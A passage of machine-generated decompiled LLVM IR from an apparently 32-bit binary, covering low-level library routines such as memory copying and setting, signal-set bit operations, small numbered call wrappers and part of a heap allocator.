; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8052743(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052743:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8052744 = load i32, i32* @esi, align 4
  store i32 %v0_8052744, i32* %stack_var_-8, align 4
  %v4_8052745 = ptrtoint i8* %arg1 to i32
  %v9_8052751 = icmp ugt i8* %tmp3, %arg1
  %v1_8052753 = icmp eq i1 %v9_8052751, false
  br i1 %v1_8052753, label %dec_label_pc_805275b, label %dec_label_pc_8052755

dec_label_pc_8052755:                             ; preds = %dec_label_pc_8052743
  %v7_8052757 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_8052767

dec_label_pc_805275b:                             ; preds = %dec_label_pc_8052743
  %v3_805275b = add i32 %arg2, -1
  %v4_805275b = add i32 %v3_805275b, %arg3
  %v5_805275b = inttoptr i32 %v4_805275b to i8*
  %v3_805275f = add i32 %v4_8052745, -1
  %v4_805275f = add i32 %v3_805275f, %arg3
  %v5_805275f = inttoptr i32 %v4_805275f to i8*
  %v7_8052764 = call i8* @_memcpy(i8* %v5_805275f, i8* %v5_805275b, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8052767

dec_label_pc_8052767:                             ; preds = %dec_label_pc_8052755, %dec_label_pc_805275b
  %v2_8052767 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052767, i32* @esi, align 4
  ret i32 %v4_8052745

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052767, { 1, 0 }
}

define i32 @function_805276a(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805276a:
  %v0_805276a = load i32, i32* @edi, align 4
  %v4_8052773 = ptrtoint i8* %arg1 to i32
  %v5_8052777 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805276a, i32* @edi, align 4
  ret i32 %v4_8052773

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_805277f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805277f:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052782 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805278b = inttoptr i32 %arg1 to i8*
  %v3_805278b = call i32 @function_8054989(i8* %v2_805278b, i32 %v2_8052782)
  %v1_8052796 = icmp eq i32 %v3_805278b, 0
  br i1 %v1_8052796, label %dec_label_pc_805279e, label %dec_label_pc_805279a

dec_label_pc_805279a:                             ; preds = %dec_label_pc_805277f
  %v3_805279a = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805279e

dec_label_pc_805279e:                             ; preds = %dec_label_pc_805277f, %dec_label_pc_805279a
  %v0_805279e = phi i32 [ -1, %dec_label_pc_805277f ], [ %v3_805279a, %dec_label_pc_805279a ]
  ret i32 %v0_805279e

; uselistorder directives
  uselistorder label %dec_label_pc_805279e, { 1, 0 }
}

define i32 @function_80527a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80527a4:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80527bf = ptrtoint i32* %stack_var_-12 to i32
  %v2_80527c6 = call i32 @function_80543d3(i32 5, i32 %v2_80527bf)
  ret i32 %v2_80527c6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80527cf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80527cf:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80527ea = ptrtoint i32* %stack_var_-12 to i32
  %v2_80527f1 = call i32 @function_80543d3(i32 2, i32 %v2_80527ea)
  ret i32 %v2_80527f1

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80527fa(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80527fa:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052815 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805281c = call i32 @function_80543d3(i32 3, i32 %v2_8052815)
  ret i32 %v2_805281c

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8052825(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052825:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052840 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052847 = call i32 @function_80543d3(i32 6, i32 %v2_8052840)
  ret i32 %v2_8052847

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8052850() local_unnamed_addr {
dec_label_pc_8052850:
  %stack_var_-20 = alloca i32, align 4
  %v2_805287b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052882 = call i32 @function_80543d3(i32 15, i32 %v2_805287b)
  ret i32 %v2_8052882
}

define i32 @function_805288b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805288b:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805289e = ptrtoint i32* %stack_var_-8 to i32
  %v2_80528a5 = call i32 @function_80543d3(i32 4, i32 %v2_805289e)
  ret i32 %v2_80528a5

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_80528ae() local_unnamed_addr {
dec_label_pc_80528ae:
  %stack_var_-16 = alloca i32, align 4
  %v2_80528d1 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80528d8 = call i32 @function_80543d3(i32 10, i32 %v2_80528d1)
  ret i32 %v2_80528d8
}

define i32 @function_80528e1() local_unnamed_addr {
dec_label_pc_80528e1:
  %stack_var_-24 = alloca i32, align 4
  %v2_8052914 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805291b = call i32 @function_80543d3(i32 12, i32 %v2_8052914)
  ret i32 %v2_805291b
}

define i32 @function_8052924() local_unnamed_addr {
dec_label_pc_8052924:
  %stack_var_-16 = alloca i32, align 4
  %v2_8052947 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805294e = call i32 @function_80543d3(i32 9, i32 %v2_8052947)
  ret i32 %v2_805294e
}

define i32 @function_8052957() local_unnamed_addr {
dec_label_pc_8052957:
  %stack_var_-24 = alloca i32, align 4
  %v2_805298a = ptrtoint i32* %stack_var_-24 to i32
  %v2_8052991 = call i32 @function_80543d3(i32 11, i32 %v2_805298a)
  ret i32 %v2_8052991
}

define i32 @function_805299a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805299a:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80529c5 = ptrtoint i32* %stack_var_-20 to i32
  %v2_80529cc = call i32 @function_80543d3(i32 14, i32 %v2_80529c5)
  ret i32 %v2_80529cc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_80529d5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80529d5:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80529f0 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80529f7 = call i32 @function_80543d3(i32 1, i32 %v2_80529f0)
  ret i32 %v2_80529f7

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_80543d3, { 5, 4, 9, 3, 8, 2, 7, 1, 10, 0, 6, 11 }
}

define i32 @function_8052a00(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a00:
  %v0_8052a03 = call i32 @function_8052235()
  %v0_8052a08 = load i32, i32* @edx, align 4
  %v4_8052a0f = call i32 @function_80522c0(i32 %v0_8052a03, i32 %arg1, i32 %v0_8052a08, i32 %v0_8052a08)
  ret i32 %v4_8052a0f

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @function_80522c0, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_8052235, { 0, 2, 1 }
}

define i32 @function_8052a18(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a18:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8052a30, label %dec_label_pc_8052a23

dec_label_pc_8052a23:                             ; preds = %dec_label_pc_8052a18
  %v1_8052a23 = add i32 %arg1, -64
  %v3_8052a23 = sub i32 63, %arg1
  %v4_8052a23 = and i32 %v3_8052a23, %arg1
  %v5_8052a23 = icmp slt i32 %v4_8052a23, 0
  %v6_8052a23 = icmp eq i32 %v1_8052a23, 0
  %v7_8052a23 = icmp slt i32 %v1_8052a23, 0
  %v3_8052a26 = icmp eq i1 %v7_8052a23, %v5_8052a23
  %v4_8052a26 = icmp eq i1 %v6_8052a23, false
  %v5_8052a26 = and i1 %v4_8052a26, %v3_8052a26
  br i1 %v5_8052a26, label %dec_label_pc_8052a30, label %dec_label_pc_8052a28

dec_label_pc_8052a28:                             ; preds = %dec_label_pc_8052a23
  %v4_8052a2b = call i32 @function_8052b2e(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8052a30

dec_label_pc_8052a30:                             ; preds = %dec_label_pc_8052a23, %dec_label_pc_8052a18, %dec_label_pc_8052a28
  %v1_8052a30 = call i32 @function_8052719(i32 ptrtoint (i32* @0 to i32))
  %v1_8052a35 = inttoptr i32 %v1_8052a30 to i32*
  store i32 22, i32* %v1_8052a35, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8052a23, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052a30, { 2, 0, 1 }
}

define i32 @function_8052a42(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a42:
  %v3_8052a50 = inttoptr i32 %arg1 to i8*
  %v4_8052a50 = call i32 @function_805276a(i8* %v3_8052a50, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8052a5b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052a5b:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8052a5b = load i32, i32* @ebx, align 4
  %v15_8052a5c = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8052a70 = icmp eq i32 %arg2, -1
  br i1 %v10_8052a70, label %dec_label_pc_8052a7e, label %dec_label_pc_8052a75

dec_label_pc_8052a75:                             ; preds = %dec_label_pc_8052a5b
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_8052a7e, label %dec_label_pc_8052a79

dec_label_pc_8052a79:                             ; preds = %dec_label_pc_8052a75
  %v7_8052a7c = icmp sgt i32 %arg1, 64
  br i1 %v7_8052a7c, label %dec_label_pc_8052a7e, label %dec_label_pc_8052a99.lr.ph

dec_label_pc_8052a7e:                             ; preds = %dec_label_pc_8052a79, %dec_label_pc_8052a75, %dec_label_pc_8052a5b
  %v1_8052a7e = call i32 @function_8052719(i32 %v0_8052a5b)
  store i32 %v1_8052a7e, i32* %eax.global-to-local, align 4
  %v1_8052a83 = inttoptr i32 %v1_8052a7e to i32*
  store i32 22, i32* %v1_8052a83, align 4
  br label %dec_label_pc_8052aff

dec_label_pc_8052a99.lr.ph:                       ; preds = %dec_label_pc_8052a79
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8052a9927 = add i32 %v15_8052a5c, 284
  %v5_8052a9928 = inttoptr i32 %v4_8052a9927 to i32*
  store i32 0, i32* %v5_8052a9928, align 4
  %v0_8052aa429 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052aa430 = add i32 %v0_8052aa429, -1
  %v9_8052aa431 = icmp slt i32 %v1_8052aa430, 0
  store i32 %v1_8052aa430, i32* %eax.global-to-local, align 4
  %v1_8052aa532 = icmp eq i1 %v9_8052aa431, false
  br i1 %v1_8052aa532, label %dec_label_pc_8052a99.dec_label_pc_8052a99_crit_edge, label %dec_label_pc_8052aa7

dec_label_pc_8052a99.dec_label_pc_8052a99_crit_edge: ; preds = %dec_label_pc_8052a99.lr.ph, %dec_label_pc_8052a99.dec_label_pc_8052a99_crit_edge
  %v1_8052aa433 = phi i32 [ %v1_8052aa4, %dec_label_pc_8052a99.dec_label_pc_8052a99_crit_edge ], [ %v1_8052aa430, %dec_label_pc_8052a99.lr.ph ]
  %v0_8052a99.pre = load i32, i32* @esp, align 4
  %v2_8052a99 = mul i32 %v1_8052aa433, 4
  %v3_8052a99 = add i32 %v0_8052a99.pre, 160
  %v4_8052a99 = add i32 %v3_8052a99, %v2_8052a99
  %v5_8052a99 = inttoptr i32 %v4_8052a99 to i32*
  store i32 0, i32* %v5_8052a99, align 4
  %v0_8052aa4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052aa4 = add i32 %v0_8052aa4, -1
  %v9_8052aa4 = icmp slt i32 %v1_8052aa4, 0
  store i32 %v1_8052aa4, i32* %eax.global-to-local, align 4
  %v1_8052aa5 = icmp eq i1 %v9_8052aa4, false
  br i1 %v1_8052aa5, label %dec_label_pc_8052a99.dec_label_pc_8052a99_crit_edge, label %dec_label_pc_8052aa7

dec_label_pc_8052aa7:                             ; preds = %dec_label_pc_8052a99.dec_label_pc_8052a99_crit_edge, %dec_label_pc_8052a99.lr.ph
  %v0_8052aa7 = load i32, i32* @edx, align 4
  %v2_8052aaa = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8052aaa, i32* %eax.global-to-local, align 4
  %v4_8052ab2 = call i32 @function_8052b2e(i32 %v2_8052aaa, i32 %arg1, i32 %v0_8052aa7, i32 %v0_8052aa7)
  store i32 %v4_8052ab2, i32* %eax.global-to-local, align 4
  %v2_8052aba = icmp slt i32 %v4_8052ab2, 0
  br i1 %v2_8052aba, label %dec_label_pc_8052aff, label %dec_label_pc_8052abe

dec_label_pc_8052abe:                             ; preds = %dec_label_pc_8052aa7
  %v4_8052ac6 = call i32 @function_8052b0a(i32 ptrtoint (i32* @global_var_8056b20.205 to i32), i32 %arg1, i32 %v4_8052ab2, i32 %v4_8052ab2)
  %v2_8052adf = ptrtoint i32* %stack_var_-284 to i32
  %v2_8052ae4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052ae4, i32* %eax.global-to-local, align 4
  %v4_8052aed = call i32 @function_80542df(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8052adf)
  store i32 %v4_8052aed, i32* %eax.global-to-local, align 4
  %v2_8052af5 = icmp slt i32 %v4_8052aed, 0
  br i1 %v2_8052af5, label %dec_label_pc_8052aff, label %dec_label_pc_8052af9

dec_label_pc_8052af9:                             ; preds = %dec_label_pc_8052abe
  %v3_8052af9 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8052b02

dec_label_pc_8052aff:                             ; preds = %dec_label_pc_8052abe, %dec_label_pc_8052aa7, %dec_label_pc_8052a7e
  br label %dec_label_pc_8052b02

dec_label_pc_8052b02:                             ; preds = %dec_label_pc_8052af9, %dec_label_pc_8052aff
  %storemerge = phi i32 [ -1, %dec_label_pc_8052aff ], [ %v3_8052af9, %dec_label_pc_8052af9 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052aa4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 10, 11, 8, 9, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 1, 2, 3, 7, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_8052b02, { 1, 0 }
  uselistorder label %dec_label_pc_8052a99.dec_label_pc_8052a99_crit_edge, { 1, 0 }
}

define i32 @function_8052b0a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052b0a:
  %v1_8052b18 = add i32 %arg2, -1
  %v1_8052b1b = urem i32 %v1_8052b18, 32
  %v2_8052b1b = icmp eq i32 %v1_8052b1b, 0
  %v2_8052b1e = udiv i32 %v1_8052b18, 32
  br i1 %v2_8052b1b, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052b0a
  %v5_8052b21 = shl i32 1, %v1_8052b1b
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052b0a, %bb
  %v6_8052b23 = phi i32 [ 1, %dec_label_pc_8052b0a ], [ %v5_8052b21, %bb ]
  %v2_8052b23 = mul nuw nsw i32 %v2_8052b1e, 4
  %v3_8052b23 = add i32 %v2_8052b23, %arg1
  %v4_8052b23 = inttoptr i32 %v3_8052b23 to i32*
  %v5_8052b23 = load i32, i32* %v4_8052b23, align 4
  %v7_8052b23 = and i32 %v5_8052b23, %v6_8052b23
  %v8_8052b23 = icmp eq i32 %v7_8052b23, 0
  %v1_8052b27 = icmp eq i1 %v8_8052b23, false
  %v2_8052b27 = zext i1 %v1_8052b27 to i32
  ret i32 %v2_8052b27

; uselistorder directives
  uselistorder i32 %v1_8052b1b, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052b2e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052b2e:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b2e = load i32, i32* @ebx, align 4
  store i32 %v0_8052b2e, i32* %stack_var_-4, align 4
  %v1_8052b3c = add i32 %arg2, -1
  %v1_8052b3f = urem i32 %v1_8052b3c, 32
  %v2_8052b3f = icmp eq i32 %v1_8052b3f, 0
  store i32 %v1_8052b3f, i32* @ecx, align 4
  %v2_8052b42 = udiv i32 %v1_8052b3c, 32
  store i32 %v2_8052b42, i32* @edx, align 4
  br i1 %v2_8052b3f, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052b2e
  %v5_8052b45 = shl i32 1, %v1_8052b3f
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052b2e, %bb
  %v6_8052b47 = phi i32 [ 1, %dec_label_pc_8052b2e ], [ %v5_8052b45, %bb ]
  %v2_8052b47 = mul nuw nsw i32 %v2_8052b42, 4
  %v3_8052b47 = add i32 %v2_8052b47, %arg1
  %v4_8052b47 = inttoptr i32 %v3_8052b47 to i32*
  %v5_8052b47 = load i32, i32* %v4_8052b47, align 4
  %v7_8052b47 = or i32 %v5_8052b47, %v6_8052b47
  store i32 %v7_8052b47, i32* %v4_8052b47, align 4
  %v2_8052b4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052b4c, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8052b42, { 1, 0 }
  uselistorder i32 %v1_8052b3f, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052b4e() local_unnamed_addr {
dec_label_pc_8052b4e:
  %v0_8052b4e = load i32, i32* @eax, align 4
  %v6_8052b61 = icmp ugt i32 %v0_8052b4e, 16777215
  br i1 %v6_8052b61, label %dec_label_pc_8052b72, label %dec_label_pc_8052b63

dec_label_pc_8052b63:                             ; preds = %dec_label_pc_8052b4e
  %tmp = icmp ult i32 %v0_8052b4e, 256
  %v2_8052b51 = udiv i32 %v0_8052b4e, 256
  %v2_8052b63 = call i32 @llvm.ctlz.i32(i32 %v2_8052b51, i1 true)
  %v3_8052b63 = xor i32 %v2_8052b63, 31
  %v5_8052b63 = select i1 %tmp, i32 95, i32 %v3_8052b63
  %v1_8052b66 = add nuw nsw i32 %v5_8052b63, 6
  %v2_8052b69 = urem i32 %v1_8052b66, 32
  %v4_8052b69 = icmp eq i32 %v2_8052b69, 0
  br i1 %v4_8052b69, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052b63
  %v5_8052b69 = lshr i32 %v0_8052b4e, %v2_8052b69
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052b63, %bb
  %v0_8052b6b = phi i32 [ %v0_8052b4e, %dec_label_pc_8052b63 ], [ %v5_8052b69, %bb ]
  %v1_8052b6b = urem i32 %v0_8052b6b, 4
  %v2_8052b6e = mul nuw nsw i32 %v5_8052b63, 4
  %v3_8052b6e = or i32 %v1_8052b6b, 32
  %v4_8052b6e = add nuw nsw i32 %v3_8052b6e, %v2_8052b6e
  br label %dec_label_pc_8052b72

dec_label_pc_8052b72:                             ; preds = %dec_label_pc_8052b4e, %bb4
  %v0_8052b73 = phi i32 [ 95, %dec_label_pc_8052b4e ], [ %v4_8052b6e, %bb4 ]
  ret i32 %v0_8052b73

; uselistorder directives
  uselistorder i32 %v2_8052b69, { 1, 0 }
  uselistorder i32 %v0_8052b4e, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052b72, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8052b74(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052b74:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052b74 = load i32, i32* @ebp, align 4
  %v0_8052b75 = load i32, i32* @edi, align 4
  %v0_8052b76 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052b89 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052b89, i32* @eax, align 4
  store i32 %v2_8052b89, i32* %stack_var_-92, align 4
  %v2_8052b8e = call i32 @function_80540a0(i32 %v2_8052b89, i32 134561949)
  store i32 %v2_8052b8e, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056800.206 to i32), i32* %stack_var_-92, align 4
  %v1_8052b9a = call i32 @function_805409d(i32 ptrtoint (i32* @global_var_8056800.206 to i32))
  store i32 %v1_8052b9a, i32* %eax.global-to-local, align 4
  %v0_8052ba2 = load i32, i32* %ebx.global-to-local, align 4
  %tmp124 = icmp ult i32 %v0_8052ba2, -32
  br i1 %tmp124, label %dec_label_pc_8052bb9, label %dec_label_pc_8052ba7

dec_label_pc_8052ba7:                             ; preds = %dec_label_pc_8052b74
  %v0_8052ba7 = load i32, i32* %stack_var_-92, align 4
  %v1_8052ba7 = call i32 @function_8052719(i32 %v0_8052ba7)
  store i32 %v1_8052ba7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052bae = inttoptr i32 %v1_8052ba7 to i32*
  store i32 12, i32* %v1_8052bae, align 4
  br label %dec_label_pc_80532de

dec_label_pc_8052bb9:                             ; preds = %dec_label_pc_8052b74
  %v1_8052bb9 = add i32 %v0_8052ba2, 11
  %tmp125 = icmp ult i32 %v1_8052bb9, 16
  br i1 %tmp125, label %dec_label_pc_8052bd0, label %dec_label_pc_8052bc9

dec_label_pc_8052bc9:                             ; preds = %dec_label_pc_8052bb9
  %v1_8052bc9 = and i32 %v1_8052bb9, -8
  br label %dec_label_pc_8052bd0

dec_label_pc_8052bd0:                             ; preds = %dec_label_pc_8052bb9, %dec_label_pc_8052bc9
  %storemerge135 = phi i32 [ %v1_8052bc9, %dec_label_pc_8052bc9 ], [ %v1_8052bb9, %dec_label_pc_8052bb9 ]
  %v1_8052f68 = phi i32 [ %v1_8052bc9, %dec_label_pc_8052bc9 ], [ 16, %dec_label_pc_8052bb9 ]
  store i32 %storemerge135, i32* %eax.global-to-local, align 4
  %v0_8052bd0 = load i8, i8* @global_var_8056ba0.207, align 1
  %v1_8052bd0 = sext i8 %v0_8052bd0 to i32
  store i32 %v1_8052bd0, i32* @ebx, align 4
  %v3_8052bd6 = urem i8 %v0_8052bd0, 2
  %v4_8052bd6 = icmp eq i8 %v3_8052bd6, 0
  %v1_8052bd9 = icmp eq i1 %v4_8052bd6, false
  br i1 %v1_8052bd9, label %dec_label_pc_8052bf8, label %dec_label_pc_8052bdb

dec_label_pc_8052bdb:                             ; preds = %dec_label_pc_8052bd0
  %v2_8052bdb = icmp eq i8 %v0_8052bd0, 0
  %v1_8052bdd = icmp eq i1 %v2_8052bdb, false
  br i1 %v1_8052bdd, label %dec_label_pc_8052ed3, label %dec_label_pc_8052be3

dec_label_pc_8052be3:                             ; preds = %dec_label_pc_8052bdb
  store i32 ptrtoint (i8* @global_var_8056ba0.207 to i32), i32* %stack_var_-92, align 4
  %v2_8052beb = call i32 @function_8053791(i32* bitcast (i8* @global_var_8056ba0.207 to i32*))
  store i32 %v2_8052beb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ed3

dec_label_pc_8052bf8:                             ; preds = %dec_label_pc_8052bd0
  %v11_8052bf8 = trunc i32 %v1_8052f68 to i8
  %v8_8052bfc = icmp ugt i8 %v11_8052bf8, %v0_8052bd0
  br i1 %v8_8052bfc, label %dec_label_pc_8052c19, label %dec_label_pc_8052bfe

dec_label_pc_8052bfe:                             ; preds = %dec_label_pc_8052bf8
  %v2_8052c02 = udiv i32 %v1_8052f68, 2
  store i32 %v2_8052c02, i32* %eax.global-to-local, align 4
  %v1_8052c04 = add i32 %v2_8052c02, ptrtoint (i8* @global_var_8056ba0.207 to i32)
  store i32 %v1_8052c04, i32* %ecx.global-to-local, align 4
  %v1_8052c0a = add i32 %v2_8052c02, add (i32 ptrtoint (i8* @global_var_8056ba0.207 to i32), i32 -4)
  %v2_8052c0a = inttoptr i32 %v1_8052c0a to i32*
  %v3_8052c0a = load i32, i32* %v2_8052c0a, align 4
  store i32 %v3_8052c0a, i32* @edx, align 4
  %v1_8052c0d = icmp eq i32 %v3_8052c0a, 0
  br i1 %v1_8052c0d, label %dec_label_pc_8052c19, label %dec_label_pc_8052c11

dec_label_pc_8052c11:                             ; preds = %dec_label_pc_8052bfe
  %v1_8052c11 = add i32 %v3_8052c0a, 8
  %v2_8052c11 = inttoptr i32 %v1_8052c11 to i32*
  %v3_8052c11 = load i32, i32* %v2_8052c11, align 4
  store i32 %v3_8052c11, i32* %eax.global-to-local, align 4
  store i32 %v3_8052c11, i32* %v2_8052c0a, align 4
  br label %dec_label_pc_8052c52

dec_label_pc_8052c19:                             ; preds = %dec_label_pc_8052bfe, %dec_label_pc_8052bf8
  %v8_8052c19 = icmp ult i32 %v1_8052f68, 255
  %v6_8052c21 = icmp ugt i32 %v1_8052f68, 255
  store i32 %v1_8052f68, i32* @eax, align 4
  br i1 %v6_8052c21, label %dec_label_pc_8052c5a, label %dec_label_pc_8052c23

dec_label_pc_8052c23:                             ; preds = %dec_label_pc_8052c19
  %v2_8052c27 = udiv i32 %v1_8052f68, 8
  store i32 %v2_8052c27, i32* %eax.global-to-local, align 4
  %v1_8052c2e = mul nuw i32 %v2_8052c27, 8
  %v2_8052c2e = add i32 %v1_8052c2e, ptrtoint (i32* @global_var_8056bcc.208 to i32)
  store i32 %v2_8052c2e, i32* %ecx.global-to-local, align 4
  %v1_8052c35 = add i32 %v1_8052c2e, add (i32 ptrtoint (i32* @global_var_8056bcc.208 to i32), i32 12)
  %v2_8052c35 = inttoptr i32 %v1_8052c35 to i32*
  %v3_8052c35 = load i32, i32* %v2_8052c35, align 4
  store i32 %v3_8052c35, i32* @edx, align 4
  %v12_8052c38 = icmp eq i32 %v3_8052c35, %v2_8052c2e
  br i1 %v12_8052c38, label %dec_label_pc_8052d56.preheader, label %dec_label_pc_8052c40

dec_label_pc_8052c40:                             ; preds = %dec_label_pc_8052c23
  store i32 %v1_8052f68, i32* %ebx.global-to-local, align 4
  %v1_8052c44 = add i32 %v3_8052c35, 12
  %v2_8052c44 = inttoptr i32 %v1_8052c44 to i32*
  %v3_8052c44 = load i32, i32* %v2_8052c44, align 4
  store i32 %v3_8052c44, i32* %eax.global-to-local, align 4
  store i32 %v3_8052c44, i32* %v2_8052c35, align 4
  %v0_8052c4a = load i32, i32* @edx, align 4
  %v1_8052c4a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052c4a = add i32 %v0_8052c4a, 4
  %v3_8052c4a = add i32 %v2_8052c4a, %v1_8052c4a
  %v4_8052c4a = inttoptr i32 %v3_8052c4a to i32*
  %v5_8052c4a = load i32, i32* %v4_8052c4a, align 4
  %v6_8052c4a = or i32 %v5_8052c4a, 1
  store i32 %v6_8052c4a, i32* %v4_8052c4a, align 4
  %v0_8052c4f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052c4f = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c4f = add i32 %v1_8052c4f, 8
  %v3_8052c4f = inttoptr i32 %v2_8052c4f to i32*
  store i32 %v0_8052c4f, i32* %v3_8052c4f, align 4
  br label %dec_label_pc_8052c52

